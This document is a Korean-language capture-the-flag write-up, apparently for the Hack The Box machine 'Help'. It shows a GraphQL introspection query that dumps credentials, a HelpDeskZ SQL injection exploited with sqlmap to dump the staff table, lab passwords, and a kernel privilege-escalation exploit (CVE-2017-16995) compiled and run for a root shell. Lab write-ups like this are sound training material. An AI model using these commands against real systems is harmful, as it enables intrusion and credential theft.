# Help
- [Recon](#recon)
- [HTTP(3000)](#http3000)
- [HTTP(80)](#http80)
- [Privesc](#privesc)
- [FLAG](#flag)

## Recon
```bash
sudo nmap -p 22,80,3000 -sC -sV -vv -oA help 10.129.223.114
```
<img width="1203" height="489" alt="image" src="https://github.com/user-attachments/assets/578834e0-3db2-4618-a7a8-15f42e710f82" />

- SSH
- HTTP(80)
- HTTP(3000)

---
## HTTP(3000)
### banner grabbing
<img width="1203" height="317" alt="image" src="https://github.com/user-attachments/assets/465add28-0db6-4e81-98d4-4972f0a823b4" />

### GraphQL
- 메인페이지에서 쿼리를 사용해서 계정 정보를 확인하라고 출력.
<img width="670" height="104" alt="image" src="https://github.com/user-attachments/assets/aa0e2597-fcf3-4674-b34d-abf5055694dc" />

<br>
<br>


- `express`로 서버를 실행 중.
<img width="670" height="104" alt="image" src="https://github.com/user-attachments/assets/91ae9ec4-896b-4f09-a2fc-872644b86f39" />

<br>
<br>

- 데이터베이스를 확인할 수 없는 상태.
- `query`를 파라미터로 생각하여 `graphql`에서 요청해보니 성공.
<img width="778" height="275" alt="image" src="https://github.com/user-attachments/assets/6be359b7-33ae-499a-be9a-e7f0e9cb4663" />

<br>
<br>

- https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html?highlight=graphql#basic-enumeration
- 타입과 필드를 알아내기 위해 쿼리 요청.
```
http://10.129.223.114:3000/graphql/?query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name,%20kind}}}}}}}
```
<img width="1119" height="468" alt="image" src="https://github.com/user-attachments/assets/61564370-bc6f-493b-a03e-83a4d9087c4b" />

<br>
<br>

- `User`타입의 `username`과 `password`필드를 요청하여 계정 정보 획득.
```
http://10.129.223.114:3000/graphql/?query={user{username,password}}
```
<img width="647" height="212" alt="image" src="https://github.com/user-attachments/assets/61850454-6862-470d-9678-21a831f57860" />

<br>
<br>

- 비밀번호 크래킹.
<img width="1249" height="109" alt="image" src="https://github.com/user-attachments/assets/b48c8976-d517-4d88-a895-5e1572881957" />

---
## HTTP(80)
- `/etc/hosts`에 `help.htb` 추가.
<img width="1203" height="77" alt="image" src="https://github.com/user-attachments/assets/2435f13f-5407-4629-ab85-b08d2d7ff520" />

### banner grabbing
<img width="1203" height="397" alt="image" src="https://github.com/user-attachments/assets/21302acc-84fd-4120-834c-7635ebab1952" />

### SQL Injection
- `/support` 경로 발견.
```bash
feroxbuster -u http://help.htb -x php,md,txt,js,html -C 404,405 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```
<img width="1203" height="367" alt="image" src="https://github.com/user-attachments/assets/a6b8edf8-85c2-44be-a37b-5e3711e1138d" />

<br>
<br>

- `HelpDeskZ`가 실행 중.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/2776b6a7-f3cf-4733-b7a6-b0708e314a26" />

<br>
<br>

- `README.md`파일에서 버전 정보 발견.(1.0.2)
<img width="1001" height="178" alt="image" src="https://github.com/user-attachments/assets/186aac8c-3677-4e41-b642-9312694bda79" />

<br>
<br>

- `searchsploit`으로 2가지 취약점 발견.
```bash
searchsploit helpdeskz
```
<img width="1203" height="179" alt="image" src="https://github.com/user-attachments/assets/5838c988-3688-44a1-ae63-ebac72c93a04" />

<br>
<br>

- 업로드 취약점은 시도하였으나 실패.
- SQL Injection 취약점은 보여지는 것은 1.0.2 버전 아래였으나 스크립트를 확인해보니 1.0.2버전까지도 실행 가능.
<img width="1203" height="254" alt="image" src="https://github.com/user-attachments/assets/c821bcc8-ae86-44d2-8086-4dfbefacebb7" />

<br>
<br>

- 유효한 `ticket_id`와 `attachment_id`를  넣어서 인젝션을 시도.
<img width="1203" height="367" alt="image" src="https://github.com/user-attachments/assets/620a740f-b630-4bc5-830b-4bbf047ec35a" />

<br>
<br>

- 3000번 포트에서 획득한 계정을 가지고 로그인 시도하여 성공.(helpme@helpme.com:godhelpmeplz)
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/549590fd-fb81-4042-8091-83bb63854a9d" />

<br>
<br>

- 티켓 제출.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/0aa10535-b7b1-4cd5-be1c-eef174cdba2a" />

<br>
<br>

- `My Tickets` 탭에서 제출한 티켓 확인 가능.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/e6988831-7833-4bea-8a52-ede18e5b8d48" />

<br>
<br>

- `burpsuite`로 티켓 다운로드 링크를 가로채서 로컬에 저장.
<img width="774" height="371" alt="image" src="https://github.com/user-attachments/assets/c54dbd90-b06c-403e-b4b3-c413fb7e2e72" />

<br>
<br>

- `sqlmap`을 사용하여 Injection 시도.
```bash
sqlmap -r req --batch --threads=10 --flush
```
<img width="1202" height="285" alt="image" src="https://github.com/user-attachments/assets/c4f4d1e4-cbe8-477f-b9d1-5b5753f41b8f" />

<br>
<br>

- `support` 데이터베이스의 `staff`테이블에서 관리자 계정 획득.
```bash
sqlmap -r req --batch --threads=5 -D support -T staff --dump
```
<img width="1202" height="285" alt="image" src="https://github.com/user-attachments/assets/40a7571d-b361-4d46-b576-aec1069973bc" />

<br>
<br>

- `support`와 `helpme` 계정으로 SSH 로그인 시도하였으나 실패.
- `help:Welcome1` SSH 로그인 성공.
<img width="1202" height="533" alt="image" src="https://github.com/user-attachments/assets/8528be90-18e2-47df-b906-a548b63b7543" />

---
## Privesc
- 특별한 정보를 찾을 수 없었음.
- kernel 4.4.0-116-generic
<img width="1202" height="49" alt="image" src="https://github.com/user-attachments/assets/56f47e8f-136d-4420-806e-4428f14063eb" />

### CVE-2017-16995
- https://nvd.nist.gov/vuln/detail/cve-2017-16995
<img width="1013" height="322" alt="image" src="https://github.com/user-attachments/assets/3e0880ec-c935-4aba-bd4e-d1e6b51396e1" />

<br>
<br>

- https://www.exploit-db.com/exploits/45010
- 로컬로부터 다운로드 받아서 컴파일.
```bash
gcc 45010.c -o pwn
```
<img width="1202" height="288" alt="image" src="https://github.com/user-attachments/assets/e11967a7-6227-4651-9c5d-9515cf94b206" />

<br>
<br>

- 실행하여 셸 획득.
<img width="1202" height="457" alt="image" src="https://github.com/user-attachments/assets/fb2d54c5-1405-4731-a84d-177502345320" />

---
## FLAG
- `/home/help/user.txt`
<img width="1202" height="387" alt="image" src="https://github.com/user-attachments/assets/634b95c6-0a32-4e33-a77d-34f0111f0b16" />

<br>
<br>

- `/root/root.txt`
<img width="1202" height="314" alt="image" src="https://github.com/user-attachments/assets/c1bb8091-cb37-405f-a15b-11a114b36df2" />
